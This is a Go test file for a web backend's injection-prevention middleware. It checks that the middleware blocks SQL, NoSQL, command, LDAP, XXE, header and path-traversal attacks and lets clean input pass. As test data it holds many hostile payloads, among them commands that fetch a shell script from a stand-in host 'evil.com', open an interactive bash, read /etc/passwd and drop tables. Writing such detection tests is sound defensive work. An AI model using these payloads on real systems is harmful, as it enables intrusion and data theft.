package security_test

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/gin-gonic/gin"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/mimi6060/festivals/backend/internal/middleware"
)

func init() {
	gin.SetMode(gin.TestMode)
}

func setupInjectionTestRouter(cfg middleware.InjectionConfig) *gin.Engine {
	router := gin.New()
	router.Use(middleware.InjectionPrevention(cfg))

	router.GET("/test", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"status": "ok"})
	})

	router.POST("/test", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"status": "ok"})
	})

	router.GET("/search", func(c *gin.Context) {
		query := c.Query("q")
		c.JSON(http.StatusOK, gin.H{"query": query})
	})

	return router
}

// ============================================================================
// SQL Injection Tests
// ============================================================================

func TestSQLInjectionInQueryParams(t *testing.T) {
	cfg := middleware.DefaultInjectionConfig()
	router := setupInjectionTestRouter(cfg)

	testCases := []struct {
		name    string
		param   string
		blocked bool
	}{
		// Basic SQL injection
		{"UNION SELECT", "1 UNION SELECT * FROM users", true},
		{"OR 1=1", "admin' OR '1'='1", true},
		{"AND 1=1", "admin' AND '1'='1", true},
		{"Comment injection", "admin'--", true},
		{"Semicolon injection", "admin'; DROP TABLE users;--", true},

		// Blind SQL injection
		{"Sleep injection", "1' AND SLEEP(5)--", true},
		{"Benchmark injection", "1' AND BENCHMARK(5000000,SHA1('test'))--", true},
		{"WAITFOR injection", "1'; WAITFOR DELAY '00:00:05'--", true},

		// Advanced SQL injection
		{"CHAR encoding", "CHAR(65,66,67)", true},
		{"CONCAT injection", "CONCAT('a','b')", true},
		{"Information schema", "1' UNION SELECT table_name FROM information_schema.tables--", true},

		// Stacked queries
		{"Stacked SELECT", "1; SELECT * FROM users", true},
		{"Stacked INSERT", "1; INSERT INTO users VALUES(1,2)", true},
		{"Stacked DELETE", "1; DELETE FROM users", true},

		// Safe inputs
		{"Normal text", "hello world", false},
		{"Email", "user@example.com", false},
		{"Number", "12345", false},
		{"UUID", "550e8400-e29b-41d4-a716-446655440000", false},
		{"Normal sentence", "The quick brown fox", false},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", "/search?q="+tc.param, nil)
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.blocked {
				assert.Equal(t, http.StatusForbidden, w.Code, "Expected request to be blocked for: %s", tc.param)
			} else {
				assert.Equal(t, http.StatusOK, w.Code, "Expected request to pass for: %s", tc.param)
			}
		})
	}
}

func TestSQLInjectionInRequestBody(t *testing.T) {
	cfg := middleware.DefaultInjectionConfig()
	router := setupInjectionTestRouter(cfg)

	testCases := []struct {
		name    string
		body    map[string]interface{}
		blocked bool
	}{
		{
			name:    "SQL in JSON field",
			body:    map[string]interface{}{"username": "admin' OR '1'='1"},
			blocked: true,
		},
		{
			name:    "UNION in nested JSON",
			body:    map[string]interface{}{"data": map[string]string{"query": "1 UNION SELECT * FROM users"}},
			blocked: true,
		},
		{
			name:    "Clean JSON data",
			body:    map[string]interface{}{"username": "john_doe", "email": "john@example.com"},
			blocked: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			body, _ := json.Marshal(tc.body)
			req := httptest.NewRequest("POST", "/test", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.blocked {
				assert.Equal(t, http.StatusForbidden, w.Code)
			} else {
				assert.Equal(t, http.StatusOK, w.Code)
			}
		})
	}
}

// ============================================================================
// NoSQL Injection Tests
// ============================================================================

func TestNoSQLInjection(t *testing.T) {
	cfg := middleware.DefaultInjectionConfig()
	router := setupInjectionTestRouter(cfg)

	testCases := []struct {
		name    string
		body    map[string]interface{}
		blocked bool
	}{
		{
			name:    "$where operator",
			body:    map[string]interface{}{"$where": "this.password == 'admin'"},
			blocked: true,
		},
		{
			name:    "$gt operator",
			body:    map[string]interface{}{"password": map[string]string{"$gt": ""}},
			blocked: true,
		},
		{
			name:    "$ne operator",
			body:    map[string]interface{}{"password": map[string]string{"$ne": ""}},
			blocked: true,
		},
		{
			name:    "$regex operator",
			body:    map[string]interface{}{"username": map[string]string{"$regex": ".*"}},
			blocked: true,
		},
		{
			name:    "JavaScript function",
			body:    map[string]interface{}{"code": "function() { return true; }"},
			blocked: true,
		},
		{
			name:    "Clean MongoDB query structure",
			body:    map[string]interface{}{"username": "john", "password": "secret123"},
			blocked: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			body, _ := json.Marshal(tc.body)
			req := httptest.NewRequest("POST", "/test", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.blocked {
				assert.Equal(t, http.StatusForbidden, w.Code)
			} else {
				assert.Equal(t, http.StatusOK, w.Code)
			}
		})
	}
}

// ============================================================================
// Command Injection Tests
// ============================================================================

func TestCommandInjection(t *testing.T) {
	cfg := middleware.DefaultInjectionConfig()
	router := setupInjectionTestRouter(cfg)

	testCases := []struct {
		name    string
		param   string
		blocked bool
	}{
		// Shell metacharacters
		{"Semicolon", "test; ls -la", true},
		{"Pipe", "test | cat /etc/passwd", true},
		{"Ampersand", "test && whoami", true},
		{"Backticks", "test `whoami`", true},

		// Command substitution
		{"Dollar paren", "$(cat /etc/passwd)", true},
		{"Dollar brace", "${IFS}", true},

		// Common commands
		{"cat passwd", "; cat /etc/passwd", true},
		{"wget command", "| wget http://evil.com/shell.sh", true},
		{"curl command", "&& curl http://evil.com/", true},
		{"bash command", "; bash -i", true},

		// Newline injection
		{"Newline injection", "test\nwhoami", true},

		// Safe inputs
		{"Normal filename", "document.pdf", false},
		{"Path without traversal", "images/photo.jpg", false},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", "/search?q="+tc.param, nil)
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.blocked {
				assert.Equal(t, http.StatusForbidden, w.Code, "Expected request to be blocked for: %s", tc.param)
			} else {
				assert.Equal(t, http.StatusOK, w.Code, "Expected request to pass for: %s", tc.param)
			}
		})
	}
}

// ============================================================================
// Path Traversal Tests
// ============================================================================

func TestPathTraversal(t *testing.T) {
	cfg := middleware.DefaultInjectionConfig()
	router := setupInjectionTestRouter(cfg)

	testCases := []struct {
		name    string
		path    string
		blocked bool
	}{
		// Basic path traversal
		{"Dot dot slash", "/test?file=../../../etc/passwd", true},
		{"Dot dot backslash", "/test?file=..\\..\\..\\windows\\system32", true},

		// URL encoded
		{"URL encoded slash", "/test?file=%2e%2e%2f%2e%2e%2f", true},
		{"Double URL encoded", "/test?file=%252e%252e%252f", true},

		// Mixed encoding
		{"Mixed encoding", "/test?file=..%2f..%2f", true},

		// Target files
		{"etc passwd", "/test?file=etc/passwd", true},
		{"etc shadow", "/test?file=etc/shadow", true},
		{"windows system32", "/test?file=windows/system32/config", true},

		// Safe paths
		{"Normal path", "/test?file=images/photo.jpg", false},
		{"Clean filename", "/test?file=document.pdf", false},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", tc.path, nil)
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.blocked {
				assert.Equal(t, http.StatusForbidden, w.Code, "Expected request to be blocked for: %s", tc.path)
			} else {
				assert.Equal(t, http.StatusOK, w.Code, "Expected request to pass for: %s", tc.path)
			}
		})
	}
}

// ============================================================================
// XXE (XML External Entity) Tests
// ============================================================================

func TestXXEInjection(t *testing.T) {
	cfg := middleware.DefaultInjectionConfig()
	router := setupInjectionTestRouter(cfg)

	testCases := []struct {
		name    string
		body    string
		blocked bool
	}{
		{
			name: "DOCTYPE with ENTITY",
			body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
			blocked: true,
		},
		{
			name: "External ENTITY",
			body: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>`,
			blocked: true,
		},
		{
			name: "Parameter entity",
			body: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>`,
			blocked: true,
		},
		{
			name:    "Clean XML",
			body:    `<?xml version="1.0"?><user><name>John</name></user>`,
			blocked: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest("POST", "/test", bytes.NewBufferString(tc.body))
			req.Header.Set("Content-Type", "application/xml")
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.blocked {
				assert.Equal(t, http.StatusForbidden, w.Code)
			} else {
				assert.Equal(t, http.StatusOK, w.Code)
			}
		})
	}
}

// ============================================================================
// Header Injection Tests
// ============================================================================

func TestHeaderInjection(t *testing.T) {
	cfg := middleware.DefaultInjectionConfig()
	router := setupInjectionTestRouter(cfg)

	testCases := []struct {
		name    string
		header  string
		value   string
		blocked bool
	}{
		{
			name:    "SQL in User-Agent",
			header:  "User-Agent",
			value:   "Mozilla/5.0' OR '1'='1",
			blocked: true,
		},
		{
			name:    "XSS in Referer",
			header:  "Referer",
			value:   "http://example.com/<script>alert(1)</script>",
			blocked: true,
		},
		{
			name:    "Command in X-Forwarded-For",
			header:  "X-Forwarded-For",
			value:   "127.0.0.1; cat /etc/passwd",
			blocked: true,
		},
		{
			name:    "Clean User-Agent",
			header:  "User-Agent",
			value:   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
			blocked: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", "/test", nil)
			req.Header.Set(tc.header, tc.value)
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.blocked {
				assert.Equal(t, http.StatusForbidden, w.Code)
			} else {
				assert.Equal(t, http.StatusOK, w.Code)
			}
		})
	}
}

// ============================================================================
// LDAP Injection Tests
// ============================================================================

func TestLDAPInjection(t *testing.T) {
	cfg := middleware.DefaultInjectionConfig()
	router := setupInjectionTestRouter(cfg)

	testCases := []struct {
		name    string
		param   string
		blocked bool
	}{
		{"Wildcard", "*(cn=*)", true},
		{"OR injection", ")(|(cn=*)", true},
		{"AND injection", ")(&(cn=admin)", true},
		{"NOT injection", ")(!(cn=admin)", true},
		{"Null byte", "admin\x00", true},
		{"Clean username", "john.doe", false},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", "/search?q="+tc.param, nil)
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			if tc.blocked {
				assert.Equal(t, http.StatusForbidden, w.Code)
			} else {
				assert.Equal(t, http.StatusOK, w.Code)
			}
		})
	}
}

// ============================================================================
// Configuration Tests
// ============================================================================

func TestInjectionConfigExclusions(t *testing.T) {
	cfg := middleware.DefaultInjectionConfig()
	cfg.ExcludePaths = []string{"/webhook"}
	router := setupInjectionTestRouter(cfg)

	// Add webhook endpoint
	router.POST("/webhook", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"status": "ok"})
	})

	// SQL injection should be blocked on normal endpoint
	req := httptest.NewRequest("GET", "/search?q=1 UNION SELECT * FROM users", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)
	assert.Equal(t, http.StatusForbidden, w.Code)

	// Same attack should pass on excluded path
	body := []byte(`{"data": "1 UNION SELECT * FROM users"}`)
	req = httptest.NewRequest("POST", "/webhook", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w = httptest.NewRecorder()
	router.ServeHTTP(w, req)
	assert.Equal(t, http.StatusOK, w.Code)
}

func TestInjectionConfigSelectiveProtection(t *testing.T) {
	// Only enable SQL injection protection
	cfg := middleware.InjectionConfig{
		EnableSQLInjection:     true,
		EnableNoSQLInjection:   false,
		EnableCommandInjection: false,
		EnableXSS:              false,
		EnableLDAPInjection:    false,
		EnableXMLInjection:     false,
		EnablePathTraversal:    false,
		BlockRequests:          true,
	}
	router := setupInjectionTestRouter(cfg)

	// SQL injection should be blocked
	req := httptest.NewRequest("GET", "/search?q=1 UNION SELECT * FROM users", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)
	assert.Equal(t, http.StatusForbidden, w.Code)

	// XSS should pass (disabled)
	req = httptest.NewRequest("GET", "/search?q=<script>alert(1)</script>", nil)
	w = httptest.NewRecorder()
	router.ServeHTTP(w, req)
	assert.Equal(t, http.StatusOK, w.Code)
}

func TestInjectionLogOnlyMode(t *testing.T) {
	cfg := middleware.DefaultInjectionConfig()
	cfg.BlockRequests = false // Log only, don't block
	router := setupInjectionTestRouter(cfg)

	// Attack should be logged but not blocked
	req := httptest.NewRequest("GET", "/search?q=1 UNION SELECT * FROM users", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)
	assert.Equal(t, http.StatusOK, w.Code)
}

// ============================================================================
// Helper Function Tests
// ============================================================================

func TestIsCleanInput(t *testing.T) {
	testCases := []struct {
		input string
		clean bool
	}{
		{"hello world", true},
		{"user@example.com", true},
		{"SELECT * FROM users", false},
		{"<script>alert(1)</script>", false},
		{"../../../etc/passwd", false},
	}

	for _, tc := range testCases {
		t.Run(tc.input, func(t *testing.T) {
			result := middleware.IsCleanInput(tc.input)
			assert.Equal(t, tc.clean, result)
		})
	}
}

func TestCleanInputWithSpecificChecks(t *testing.T) {
	// Test with only SQL check
	assert.True(t, middleware.CleanInput("hello world", middleware.InjectionTypeSQL))
	assert.False(t, middleware.CleanInput("1 UNION SELECT *", middleware.InjectionTypeSQL))

	// XSS attack should pass SQL check
	assert.True(t, middleware.CleanInput("<script>alert(1)</script>", middleware.InjectionTypeSQL))

	// Test with XSS check
	assert.False(t, middleware.CleanInput("<script>alert(1)</script>", middleware.InjectionTypeXSS))
}

// ============================================================================
// Benchmark Tests
// ============================================================================

func BenchmarkInjectionDetection(b *testing.B) {
	cfg := middleware.DefaultInjectionConfig()
	router := setupInjectionTestRouter(cfg)

	req := httptest.NewRequest("GET", "/search?q=normal+search+query", nil)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		w := httptest.NewRecorder()
		router.ServeHTTP(w, req)
	}
}

func BenchmarkInjectionDetectionWithAttack(b *testing.B) {
	cfg := middleware.DefaultInjectionConfig()
	router := setupInjectionTestRouter(cfg)

	req := httptest.NewRequest("GET", "/search?q=1+UNION+SELECT+*+FROM+users", nil)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		w := httptest.NewRecorder()
		router.ServeHTTP(w, req)
	}
}

func BenchmarkInjectionDetectionJSONBody(b *testing.B) {
	cfg := middleware.DefaultInjectionConfig()
	router := setupInjectionTestRouter(cfg)

	body := []byte(`{"username": "john_doe", "email": "john@example.com", "password": "secret123"}`)

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		req := httptest.NewRequest("POST", "/test", bytes.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		router.ServeHTTP(w, req)
	}
}
